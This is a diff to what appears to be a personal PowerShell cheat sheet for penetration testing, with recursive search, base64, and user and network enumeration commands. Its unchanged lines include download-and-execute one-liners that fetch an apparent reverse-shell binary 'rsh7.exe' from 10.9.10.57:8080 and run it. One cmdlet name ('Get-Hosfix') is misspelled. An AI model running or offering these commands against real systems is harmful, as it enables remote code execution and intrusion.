@@ -1,6 +1,9 @@
+
+
 # Recursive find only directorys in current directory contains <keyword> in
 # name. Output result without errors
 Get-ChildItem -Directory -Recurse -Hidden -ErrorAction SilentlyContinue | Select-String -Pattern "keyword"
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |Select-String "keyword" |select path
 
 Get-ChildItem -Path C:\Windows\ -File -Recurse -Hidden -ErrorAction SilentlyContinue | Select-String -Pattern "elf"
 
@@ -22,3 +25,19 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.10.57:8080/rsh7.exe','rsh7.exe')"
 
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.10.57:8080/rsh7.exe');Start-Process "rsh7.exe"
+
+
+# Encode/Decode base64 in Powershell
+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("SecretMessage"))
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjcmV0TWVzc2FnZQ=="))
+
+
+# Get users
+Get-LocalUser
+
+# Some network comandlets
+Get-NetIPAddress
+Get-NetTCPConnection
+
+# get installed updates info
+Get-Hosfix
